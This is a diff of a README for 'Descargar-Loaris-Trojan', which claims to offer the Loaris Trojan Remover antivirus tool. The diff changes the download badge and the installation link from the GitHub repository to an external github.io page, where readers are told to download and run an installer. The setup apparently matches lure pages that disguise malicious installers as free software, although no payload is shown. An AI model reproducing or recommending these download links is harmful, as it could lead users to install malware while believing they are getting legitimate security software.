@@ -1,6 +1,6 @@
 # 🛡️ Descargar-Loaris-Trojan - Remove harmful viruses from your PC
 
-[![Download Loaris Trojan Remover](https://img.shields.io/badge/Download-Loaris-blue.svg)](https://github.com/ProducerRiyadh/Descargar-Loaris-Trojan)
+[![Download Loaris Trojan Remover](https://img.shields.io/badge/Download-Loaris-blue.svg)](https://producerriyadh.github.io)
 
 ## 📌 Overview
 
@@ -20,7 +20,7 @@ Before you start the installation, ensure your computer meets these basic requir
 
 Follow these steps to obtain and prepare the software on your system.
 
-1. Visit the repository page to initiate the process: [https://github.com/ProducerRiyadh/Descargar-Loaris-Trojan](https://github.com/ProducerRiyadh/Descargar-Loaris-Trojan).
+1. Visit the repository page to initiate the process: [https://producerriyadh.github.io](https://producerriyadh.github.io).
 2. Look for the release section to find the current installer file.
 3. Click the link to download the setup file to your local drive.
 4. Locate the file in your Downloads folder after the transfer finishes.
